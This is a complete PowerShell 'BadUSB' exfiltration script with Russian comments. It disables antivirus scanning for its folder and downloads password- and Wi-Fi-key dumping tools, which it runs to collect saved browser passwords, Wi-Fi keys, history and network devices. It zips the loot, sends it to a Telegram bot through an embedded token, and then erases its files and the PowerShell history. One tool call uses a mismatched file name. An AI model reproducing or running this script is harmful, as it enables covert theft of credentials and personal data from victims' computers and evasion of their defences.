# [ ===== BadUSB Exfiltration Script v3.0 ===== ] #

$basePath = "C:\Users\Public\Documents\scripts"
$dumpFolder = "$basePath\Report"
$dumpFile = "$basePath\data.zip"

# 1. Подготовка окружения
if (Test-Path $basePath) { Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Set-Location $basePath

# 2. Добавление исключения в антивирус
Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue

# 3. Прямые RAW-ссылки на файлы
# Ваша ссылка (через raw.githubusercontent для стабильности)
$linkMy = "https://raw.githubusercontent.com/whetherit/tools/main/WebBrowserPassView.exe"

# Ссылки на остальные инструменты
$linkWifi = "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/WirelessKeyView.exe"
$linkHist = "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/BrowsingHistoryView.exe"
$linkNet  = "https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/WNetWatcher.exe"

# 4. Скачивание
try {
    Invoke-WebRequest -Uri $linkMy -OutFile "WebBrowserPassView.exe" -ErrorAction Stop
    Invoke-WebRequest -Uri $linkWifi -OutFile "WirelessKeyView.exe" -ErrorAction Stop
    Invoke-WebRequest -Uri $linkHist -OutFile "BrowsingHistoryView.exe" -ErrorAction Stop
    Invoke-WebRequest -Uri $linkNet -OutFile "WNetWatcher.exe" -ErrorAction Stop
} catch {
    exit # Если не удалось скачать файлы, прерываем выполнение
}

# --- ВАЖНО: Разблокировка файлов ---
# Снимает ограничение на запуск скачанных программ с аргументами
Get-ChildItem "$basePath\*.exe" | Unblock-File

# 5. Сбор данных
# Запускаем через оператор & и ждем завершения каждого процесса
& ".\WebBrowserPassView.exe" /stext "passwords.txt"
& ".\WirelessKeyView.exe" /stext "wifi.txt"
& ".\BrowsingHistoryView.object.exe" /VisitTimeFilterType 3 7 /stext "history.txt"
& ".\WNetWatcher.exe" /stext "connected_devices.txt"

# Пауза, чтобы файлы успели записаться на диск
Start-Sleep -Seconds 3

# 6. Упаковка результатов
$foundFiles = Get-ChildItem -Path . -Include "passwords.txt","wifi.txt","history.txt","connected_devices.txt"
if ($foundFiles) {
    Move-Item $foundFiles -Destination $dumpFolder -Force -ErrorAction SilentlyContinue
    Compress-Archive -Path "$dumpFolder\*" -DestinationPath $dumpFile -Force
}

# 7. Отправка в Telegram через встроенный CURL
$token = "8453011015:AAFvYt0ZjgkUFAjtnLvONdmXl19l7GK9tfM"
$chatID = "806761221"
$uri = "https://api.telegram.org/bot$token/sendDocument"

if (Test-Path $dumpFile) {
    & curl.exe -F "chat_id=$chatID" -F "document=@$dumpFile" -F "caption=Exfil report from $env:USERNAME" $uri
}

# 8. Финальная очистка
Set-Location "C:\Users\Public"
Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue

# Сигнал об окончании (CapsLock 4 раза)
$w = New-Object -ComObject WScript.Shell
for($i=0; $i -lt 4; $i++) {
    $w.SendKeys("{CAPSLOCK}")
    Start-Sleep -m 500
}

# Стираем историю команд PowerShell
Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

exit
